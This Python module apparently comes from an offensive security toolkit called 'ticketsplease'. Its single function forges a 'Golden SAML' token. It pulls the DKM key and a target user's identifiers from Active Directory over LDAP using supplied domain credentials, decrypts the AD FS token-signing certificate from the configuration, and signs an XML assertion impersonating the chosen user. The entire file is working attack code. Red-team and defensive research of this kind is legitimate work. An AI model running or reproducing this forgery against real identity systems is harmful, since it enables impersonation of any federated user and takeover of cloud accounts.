# Copyright 2021 Secureworks
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from ticketsplease.modules.saml.wmic import WMIC
from ticketsplease.modules.saml.ADFSpoof import get_signer, get_module_params

import base64
from typing import Union
from ticketsplease.modules.ldap import LDAP
from ticketsplease.modules.adfs import get_encrypted_pfx
from ticketsplease.modules.saml.utils import parse_golden_saml


def generate_golden_saml(
    adfs_config: Union[str, bytes] = None,
    adfs_config_file: str = None,
    domain: str = None,
    target_user: str = None,
    target_user_upn: str = None,
    target_user_guid: str = None,
    domain_username: str = None,
    domain_password: str = None,
    dc_ip: str = None,
    dkm_key: Union[str, bytes] = None,
    assertion: bool = False,
):
    """Generate a Golden SAML token.

    Arguments:
        adfs_config: ADFS configuration
        adfs_config_file: file containing ADFS config
        domain: target domain (i.e. company.com)
        target_user: target user
        target_user_upn: target user userPrincipalName
        target_user_guid: target user objectGUID
        domain_username: username to perform LDAP query
        domain_password: password to perform LDAP query
        dc_ip: IP address of Domain Controller for LDAP query
        dkm_key: DKM key
        assertion: boolean to extract the SAML assertion only

    Returns:
        Golden SAML token

    Raises:
        ValueError: if target user data missing
    """
    # Validate arguments
    if not adfs_config and not adfs_config_file:
        raise ValueError("adfs config or config file required")
    if not target_user and (not target_user_guid):
        raise ValueError("target_user required if no GUID provided")
    if not target_user_guid or not dkm_key:
        if not domain:
            raise ValueError("domain required when querying LDAP")
        if not dkm_key and not dc_ip:
            raise ValueError("dc_ip required if no dkm_key provided")
        if not domain_username or not domain_password:
            raise ValueError("domain username and password required for LDAP queries")

    # Read in ADFS config file
    if not adfs_config:
        with open(adfs_config_file, "r", encoding="utf-8") as f:
            adfs_config = f.read()

    # Get UPN and GUID for the target user to generate a Golden
    # SAML ticket with
    if not target_user_guid:
        (target_user_upn, target_user_guid, _) = LDAP.get_user(
            domain=domain,
            host=dc_ip,
            user=domain_username,
            password=domain_password,
            target_user=target_user,
        )
    else:
        # The UPN value does not matter
        if not target_user_upn:
            target_user_upn = "test@company.com"

    # Get the DKM Key to decrypt the EncryptedPfx from the ADFS
    # configuration
    if not dkm_key:
        dkm_key = LDAP.get_dkm(
            domain=domain,
            host=dc_ip,
            user=domain_username,
            password=domain_password,
        )

    # Parse the ADFS configuration for the EncryptedPfx and Server Issuer
    (encrypted_pfx, server_issuer) = get_encrypted_pfx(adfs_config)
    decoded_certificate = base64.b64decode(encrypted_pfx)

    # Decrypt the extracted EncryptedPfx from the ADFS configuration and
    # use that to generate a Golden SAML ticket
    signer = get_signer(decoded_certificate, dkm_key)
    (params, id_attribute) = get_module_params(
        server=server_issuer,
        upn=target_user_upn,
        guid=target_user_guid,
    )
    token = signer.sign_XML(
        params=params,
        id_attribute=id_attribute,
        algorithm="rsa-sha256",
        digest="sha256",
    )

    # Extract the Assertion from the token and encode
    if assertion:
        token = parse_golden_saml(token)
        token = base64.b64encode(token).decode()
        return token

    else:
        return token.decode()
